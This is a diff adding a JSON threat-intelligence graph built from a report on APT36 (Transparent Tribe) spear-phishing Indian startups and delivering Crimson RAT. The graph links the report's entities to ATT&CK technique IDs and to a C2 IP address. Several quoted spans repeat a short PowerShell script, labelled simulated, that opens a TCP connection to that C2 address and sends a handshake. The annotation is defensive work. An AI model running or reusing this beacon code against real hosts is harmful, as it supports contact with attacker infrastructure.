@@ -1,0 +1,260 @@
+{
+  "nodes": {
+    "high_level": [
+      {
+        "node_id": "HL_001424583ef1",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "India",
+        "sentence_indices": [
+          3
+        ],
+        "span_sentences": [
+          "This shift marks a move beyond the group’s long-standing emphasis on government and defense targets into India’s private-sector startup landscape."
+        ],
+        "edges": []
+      },
+      {
+        "node_id": "HL_56f80800a4d1",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "Crimson RAT",
+        "sentence_indices": [
+          2,
+          4
+        ],
+        "span_sentences": [
+          "When executed, the shortcut triggers a batch stage and ultimately installs Crimson RAT, providing the operators with remote access to the victim system.",
+          "The Acronis Threat Research Unit analyzed the ISO payload, embedded LNK shortcut, batch execution logic, and the resulting Crimson RAT implant."
+        ],
+        "edges": [
+          "EDGE_4ecdbea703a1",
+          "EDGE_58f4b596918e",
+          "EDGE_dfc42d7fd169",
+          "EDGE_e624493e1dc0"
+        ]
+      },
+      {
+        "node_id": "HL_87713f94840d",
+        "node_class": "high_level",
+        "node_type": "ThreatActor",
+        "node_text": "APT36",
+        "sentence_indices": [
+          0,
+          6
+        ],
+        "span_sentences": [
+          "Transparent Tribe (aka APT36) has expanded its spear-phishing activity to target Indian startup companies, with a notable focus on firms offering OSINT and cybersecurity services.",
+          "The team also identified infrastructure overlap with prior APT36 operations, including reuse patterns across domains and IP addresses."
+        ],
+        "edges": [
+          "EDGE_da0489980897"
+        ]
+      },
+      {
+        "node_id": "HL_9728b1ff28eb",
+        "node_class": "high_level",
+        "node_type": "ThreatActor",
+        "node_text": "Transparent Tribe",
+        "sentence_indices": [
+          0
+        ],
+        "span_sentences": [
+          "Transparent Tribe (aka APT36) has expanded its spear-phishing activity to target Indian startup companies, with a notable focus on firms offering OSINT and cybersecurity services."
+        ],
+        "edges": [
+          "EDGE_59354ac25277"
+        ]
+      },
+      {
+        "node_id": "HL_f2462203932d",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Acronis Threat Research Unit",
+        "sentence_indices": [
+          4
+        ],
+        "span_sentences": [
+          "The Acronis Threat Research Unit analyzed the ISO payload, embedded LNK shortcut, batch execution logic, and the resulting Crimson RAT implant."
+        ],
+        "edges": []
+      }
+    ],
+    "ttp": [
+      {
+        "node_id": "TTP_T1027",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1027",
+        "ttp_id": "T1027",
+        "best_span_sentences_list": [
+          [
+            "Their findings highlight multiple layers of obfuscation, hard-coded C2 details, use of a custom TCP communication protocol, and persistence implemented through a concealed executable placed in the user’s AppData directory.",
+            "The team also identified infrastructure overlap with prior APT36 operations, including reuse patterns across domains and IP addresses.",
+            "$c2Ip = \"93.127.133.9\" $c2Port = 12345 # primary port; change to 54321 for fallback testing try { Write-Host \"[*] Attempting C2 connection to $c2Ip:$c2Port ...\" $socket = New-Object System.Net.Sockets.TcpClient $socket.Connect($c2Ip,$c2Port) # Send a minimal handshake payload (simulated) $stream = $socket.GetStream() $payload = [System.Text.Encoding]::ASCII.GetBytes(\"HELLO`n\") $stream.Write($payload,0,$payload.Length) Write-Host \"[+] Handshake sent.\" # Keep the connection alive for a short period to ensure logging Start-Sleep -Seconds 10 $stream.Close() $socket.Close() Write-Host \"[*] Connection closed.\" } catch { Write-Error \"Failed to connect to C2: $_\" }."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            5,
+            7
+          ]
+        ],
+        "edges": [
+          "EDGE_4ecdbea703a1"
+        ]
+      },
+      {
+        "node_id": "TTP_T1071",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1071",
+        "ttp_id": "T1071",
+        "best_span_sentences_list": [
+          [
+            "Their findings highlight multiple layers of obfuscation, hard-coded C2 details, use of a custom TCP communication protocol, and persistence implemented through a concealed executable placed in the user’s AppData directory.",
+            "The team also identified infrastructure overlap with prior APT36 operations, including reuse patterns across domains and IP addresses.",
+            "$c2Ip = \"93.127.133.9\" $c2Port = 12345 # primary port; change to 54321 for fallback testing try { Write-Host \"[*] Attempting C2 connection to $c2Ip:$c2Port ...\" $socket = New-Object System.Net.Sockets.TcpClient $socket.Connect($c2Ip,$c2Port) # Send a minimal handshake payload (simulated) $stream = $socket.GetStream() $payload = [System.Text.Encoding]::ASCII.GetBytes(\"HELLO`n\") $stream.Write($payload,0,$payload.Length) Write-Host \"[+] Handshake sent.\" # Keep the connection alive for a short period to ensure logging Start-Sleep -Seconds 10 $stream.Close() $socket.Close() Write-Host \"[*] Connection closed.\" } catch { Write-Error \"Failed to connect to C2: $_\" }."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            5,
+            7
+          ]
+        ],
+        "edges": [
+          "EDGE_1c0f46427ddd",
+          "EDGE_e624493e1dc0"
+        ]
+      },
+      {
+        "node_id": "TTP_T1204",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1204",
+        "ttp_id": "T1204",
+        "best_span_sentences_list": [
+          [
+            "The infection chain delivers a malicious ISO that contains a LNK shortcut.",
+            "When executed, the shortcut triggers a batch stage and ultimately installs Crimson RAT, providing the operators with remote access to the victim system."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            1,
+            2
+          ]
+        ],
+        "edges": [
+          "EDGE_58f4b596918e"
+        ]
+      },
+      {
+        "node_id": "TTP_T1219",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1219",
+        "ttp_id": "T1219",
+        "best_span_sentences_list": [
+          [
+            "The infection chain delivers a malicious ISO that contains a LNK shortcut.",
+            "When executed, the shortcut triggers a batch stage and ultimately installs Crimson RAT, providing the operators with remote access to the victim system."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            1,
+            2
+          ]
+        ],
+        "edges": [
+          "EDGE_dfc42d7fd169"
+        ]
+      },
+      {
+        "node_id": "TTP_T1566",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1566",
+        "ttp_id": "T1566",
+        "best_span_sentences_list": [
+          [
+            "Transparent Tribe (aka APT36) has expanded its spear-phishing activity to target Indian startup companies, with a notable focus on firms offering OSINT and cybersecurity services."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            0,
+            0
+          ]
+        ],
+        "edges": [
+          "EDGE_59354ac25277",
+          "EDGE_da0489980897"
+        ]
+      }
+    ],
+    "ioc": [
+      {
+        "node_id": "IOC_fb445819b461",
+        "node_class": "ioc",
+        "node_type": "IPAddress",
+        "node_text": "93.127.133.9",
+        "sentence_indices": [
+          7
+        ],
+        "span_sentences": [
+          "$c2Ip = \"93.127.133.9\" $c2Port = 12345 # primary port; change to 54321 for fallback testing try { Write-Host \"[*] Attempting C2 connection to $c2Ip:$c2Port ...\" $socket = New-Object System.Net.Sockets.TcpClient $socket.Connect($c2Ip,$c2Port) # Send a minimal handshake payload (simulated) $stream = $socket.GetStream() $payload = [System.Text.Encoding]::ASCII.GetBytes(\"HELLO`n\") $stream.Write($payload,0,$payload.Length) Write-Host \"[+] Handshake sent.\" # Keep the connection alive for a short period to ensure logging Start-Sleep -Seconds 10 $stream.Close() $socket.Close() Write-Host \"[*] Connection closed.\" } catch { Write-Error \"Failed to connect to C2: $_\" }."
+        ],
+        "edges": [
+          "EDGE_1c0f46427ddd"
+        ]
+      }
+    ]
+  },
+  "edges": [
+    {
+      "edge_id": "EDGE_1c0f46427ddd",
+      "node_u": "IOC_fb445819b461",
+      "node_v": "TTP_T1071",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_4ecdbea703a1",
+      "node_u": "HL_56f80800a4d1",
+      "node_v": "TTP_T1027",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_58f4b596918e",
+      "node_u": "HL_56f80800a4d1",
+      "node_v": "TTP_T1204",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_59354ac25277",
+      "node_u": "HL_9728b1ff28eb",
+      "node_v": "TTP_T1566",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_da0489980897",
+      "node_u": "HL_87713f94840d",
+      "node_v": "TTP_T1566",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_dfc42d7fd169",
+      "node_u": "HL_56f80800a4d1",
+      "node_v": "TTP_T1219",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_e624493e1dc0",
+      "node_u": "HL_56f80800a4d1",
+      "node_v": "TTP_T1071",
+      "edge_type": "high_level-ttp"
+    }
+  ]
+}
